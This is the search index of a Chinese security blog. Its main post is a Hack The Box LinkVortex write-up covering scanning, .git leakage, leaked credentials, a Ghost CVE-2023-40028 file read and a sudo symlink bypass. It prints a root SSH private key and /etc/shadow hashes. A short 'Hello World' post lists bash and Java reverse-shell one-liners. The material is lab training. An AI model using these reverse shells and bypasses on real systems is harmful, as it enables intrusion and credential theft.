[{"title":"Linkvortex","url":"/2024/12/09/Linkvortex/","content":"\n靶场地址：https://app.hackthebox.com/machines/LinkVortex\n\n# 总体思路：端口&目录&子域名扫描->.git文件泄露->CVE-2023-40028->脚本利用\n\n## 端口&目录&子域名扫描\n\n```bash\nnmap -sSVC linkvortex.htb\n\nStarting Nmap 7.94SVN ( https://nmap.org )\nNmap scan report for linkvortex.htb\nHost is up (0.53s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)\n|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)\n80/tcp open  http    Apache httpd\n| http-robots.txt: 4 disallowed entries \n|_/ghost/ /p/ /email/ /r/\n|_http-server-header: Apache\n|_http-title: BitByBit Hardware\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\ndirsearch -u http://linkvortex.htb\n\nTarget: http://linkvortex.htb/\n[11:52:45] Starting: \n[11:52:51] 404 -    7KB - /%3f/                                             \n[11:52:52] 404 -    7KB - /..;/                                             \n[11:52:52] 404 -    7KB - /.admin/                                          \n[11:52:52] 404 -    7KB - /.ansible/                                        \n[11:52:52] 404 -    7KB - /.apt_generated/                                  \n[11:52:52] 404 -    7KB - /.aws/                                            \n[11:52:53] 404 -    7KB - /.build/                                          \n[11:52:53] 404 -    7KB - /.buildpath/\n...\n[11:55:32] 404 -    7KB - /root/                                            \n[11:55:31] 200 -  103B  - /robots.txt                                       \n[11:55:32] 404 -    7KB - /rpc/                                             \n...\nTask Completed\n\nffuf -w /usr/share/wordlists/seclists/Discovery/DNS/shubs-subdomains.txt -H \"Host:FUZZ.linkvortex.htb\" -u \"http://linkvortex.htb\" -c -t 64 -fs 230\n\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://linkvortex.htb\n :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/shubs-subdomains.txt\n :: Header           : Host: FUZZ.linkvortex.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 64\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 230\n________________________________________________\n\ndev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 1423ms]\n```\n\n目标只开放了22和80端口以及存在子域名dev，80端口有一个robots.txt，先去看看\n\n![image-20241208131227227](./pic/Linkvortex.assets/image-20241208131227227.png)\n\n访问一下ghost\n\n![image-20241208131611772](./pic/Linkvortex.assets/image-20241208131611772.png)\n\n~~久违的~~登陆界面\n\n先随意输入一个邮箱\n\n![image-20241208131903692](./pic/Linkvortex.assets/image-20241208131903692.png)\n\n提示email不存在，猜测管理员邮箱\n\n![image-20241208131941781](./pic/Linkvortex.assets/image-20241208131941781.png)\n\n（一猜一个准呐）\n\n这里忘记密码也不管用，查看dev界面\n\n![image-20241208133811107](./pic/Linkvortex.assets/image-20241208133811107.png)\n\n显示正在开发中，对其目录扫描一遍\n\n```bash\nTarget: http://dev.linkvortex.htb/\n[12:05:56] Starting:\n[12:06:09] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/        \n[12:06:09] 200 -  620B  - /.git/hooks/                                      \n[12:06:09] 200 -   41B  - /.git/HEAD\n[12:06:09] 200 -  201B  - /.git/config\n[12:06:09] 200 -   73B  - /.git/description\n[12:06:09] 200 -  557B  - /.git/                                            \n[12:06:09] 200 -  402B  - /.git/info/                                       \n[12:06:09] 200 -  240B  - /.git/info/exclude\n[12:06:09] 200 -  401B  - /.git/logs/\n[12:06:09] 200 -  175B  - /.git/logs/HEAD                                   \n[12:06:09] 200 -  418B  - /.git/objects/                                    \n[12:06:09] 200 -  147B  - /.git/packed-refs\n[12:06:10] 200 -  393B  - /.git/refs/                                       \n[12:06:10] 301 -  249B  - /.git/refs/tags  ->  http://dev.linkvortex.htb/.git/refs/tags/\n[12:06:15] 403 -  199B  - /.ht_wsr.txt                                      \n[12:06:16] 403 -  199B  - /.htaccess.sample                                 \n[12:06:16] 403 -  199B  - /.htaccess.save\n[12:06:16] 403 -  199B  - /.htaccess.bak1\n[12:06:16] 403 -  199B  - /.htaccess_orig\n[12:06:16] 403 -  199B  - /.html\n[12:06:16] 403 -  199B  - /.htaccess.orig\n[12:06:16] 403 -  199B  - /.htaccessOLD\n[12:06:16] 403 -  199B  - /.htaccess_sc                                     \n[12:06:16] 403 -  199B  - /.htm                                             \n[12:06:16] 403 -  199B  - /.htaccess_extra\n[12:06:16] 403 -  199B  - /.htaccessOLD2                                    \n[12:06:16] 403 -  199B  - /.htaccessBAK\n[12:06:17] 403 -  199B  - /.htpasswd_test                                   \n[12:06:17] 403 -  199B  - /.htpasswds\n[12:06:17] 403 -  199B  - /.httr-oauth                                      \n[12:06:18] 200 -  691KB - /.git/index                                       \n[12:07:22] 403 -  199B  - /cgi-bin/                                         \n[12:08:43] 403 -  199B  - /server-status                                    \n[12:08:43] 403 -  199B  - /server-status/                                                                   \nTask Completed\n```\n\n发现有.git文件泄露\n\n## .git文件泄露\n\n使用工具下载其泄露的文件\n\n```python\npython /git-dumper-master/git_dumper.py http://dev.linkvortex.htb /.git \n```\n\n在泄露的文件/.git/ghost/core/test/regression/api/admin/authentication.test.js中，有若干个密码（问就是一个个找）\n\n![image-20241208134515379](./pic/Linkvortex.assets/image-20241208134515379.png)\n\n![image-20241208134601369](./pic/Linkvortex.assets/image-20241208134601369.png)\n\n![image-20241208134611578](./pic/Linkvortex.assets/image-20241208134611578.png)\n\n![image-20241208134623654](./pic/Linkvortex.assets/image-20241208134623654.png)\n\n整理出来后逐一尝试，得到密码为**OctopiFociPilfer45S**\n\n利用凭证admin@linkvortex.htb/OctopiFociPilfer45S进入后台后，可以看到ghost版本为5.58，搜索后发现存在CVE-2023-40028\n\n## CVE-2023-40028\n\n![image-20241208134839916](./pic/Linkvortex.assets/image-20241208134839916.png)\n\n利用POC，查看是否能够读取文件\n\n![image-20241208134950803](./pic/Linkvortex.assets/image-20241208134950803.png)\n\n这里读取ghost组件中的敏感文件config.production.json\n\n![image-20241208135224392](./pic/Linkvortex.assets/image-20241208135224392.png)\n\n得到bob用户的密码后，使用SSH登录\n\n## 脚本利用\n\n查看bob用户可执行的权限\n\n![image-20241208135307819](./pic/Linkvortex.assets/image-20241208135307819.png)\n\n查看clean_symlink.sh脚本\n\n```sh\n#!/bin/bash\n\nQUAR_DIR=\"/var/quarantined\"\n\nif [ -z $CHECK_CONTENT ];then\n  CHECK_CONTENT=false\nfi\n\nLINK=$1\n\nif ! [[ \"$LINK\" =~ \\.png$ ]]; then\n  /usr/bin/echo \"! First argument must be a png file !\"\n  exit 2\nfi\n\nif /usr/bin/sudo /usr/bin/test -L $LINK;then\n  LINK_NAME=$(/usr/bin/basename $LINK)\n  LINK_TARGET=$(/usr/bin/readlink $LINK)\n  if /usr/bin/echo \"$LINK_TARGET\" | /usr/bin/grep -Eq '(etc|root)';then\n    /usr/bin/echo \"! Trying to read critical files, removing link [ $LINK ] !\"\n    /usr/bin/unlink $LINK\n  else\n    /usr/bin/echo \"Link found [ $LINK ] , moving it to quarantine\"\n    /usr/bin/mv $LINK $QUAR_DIR/\n    if $CHECK_CONTENT;then\n      /usr/bin/echo \"Content:\"\n      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null\n    fi\n  fi\nfi\n```\n\n丢进AI问一问\n\n![image-20241208135613865](./pic/Linkvortex.assets/image-20241208135613865.png)\n\n这里可以利用嵌套的方式绕过检查\n\n```bash\nexport CHECK_CONTENT=true\nln -s /home/bob/test.png /home/bob/exploit.png \n# 创建一个exploit.png指向test.png\n\nln -sf /root/.ssh/id_rsa /home/bob/test.png\n# 创建链接使得test.png指向id_rsa\n# 经过上述处理后，表面上exploit.png指向的是test.png，实际上指向的是id_rsa\n\nsudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/exploit.png\nLink found [ /home/bob/exploit.png ] , moving it to quarantine\nContent:\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n```\n\n使用id_rsa登录到root用户\n\n![image-20241208140259700](./pic/Linkvortex.assets/image-20241208140259700.png)\n\n```bash\n# /etc/shadow\nroot:$y$j9T$C3zg87gHwrCXO0vl4igIh/$iisf9sVwilKAi7mI5p1FqQslJWM9t2.YUWznIPC/XIA:19814:0:99999:7:::\ndaemon:*:19579:0:99999:7:::\nbin:*:19579:0:99999:7:::\nsys:*:19579:0:99999:7:::\nsync:*:19579:0:99999:7:::\ngames:*:19579:0:99999:7:::\nman:*:19579:0:99999:7:::\nlp:*:19579:0:99999:7:::\nmail:*:19579:0:99999:7:::\nnews:*:19579:0:99999:7:::\nuucp:*:19579:0:99999:7:::\nproxy:*:19579:0:99999:7:::\nwww-data:*:19579:0:99999:7:::\nbackup:*:19579:0:99999:7:::\nlist:*:19579:0:99999:7:::\nirc:*:19579:0:99999:7:::\ngnats:*:19579:0:99999:7:::\nnobody:*:19579:0:99999:7:::\n_apt:*:19579:0:99999:7:::\nsystemd-network:*:19579:0:99999:7:::\nsystemd-resolve:*:19579:0:99999:7:::\nmessagebus:*:19579:0:99999:7:::\nsystemd-timesync:*:19579:0:99999:7:::\npollinate:*:19579:0:99999:7:::\nsshd:*:19579:0:99999:7:::\nusbmux:*:19814:0:99999:7:::\nbob:$6$rounds=656000$4p3mw8hAd9ir.25f$ocGm9nW1TM2AB8Z.l0K.hi43bOrm3oxQsaKFACMoS2UL.tIXxSW3u/xsClrvkEhP5s.GUpdIvCX3qRtppDV8r.:19814:0:99999:7:::\ndnsmasq:*:19814:0:99999:7:::\n_laurel:!:20057::::::\n```\n"},{"title":"嗨！","url":"/2024/12/05/hi/","content":"嗨！这里是B3rry的GitHub个人博客，平常用于存放个人所学的知识点内容等。","tags":["HTB"]},{"title":"Hello World","url":"/2024/12/05/hello-world/","content":"恭喜你，进入了本界面！\n\npython脚本示例\n\n``` python\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n```\n\nbash脚本示例\n\n```bash\nbash -i >& /dev/tcp/127.0.0.1/6666 0>&1\n```\n\njava脚本示例\n\n```java\npublic class shell {\n    public static void main(String[] args) {\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/127.0.0.1/6666 0>&1\");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}\n```\n\n"}]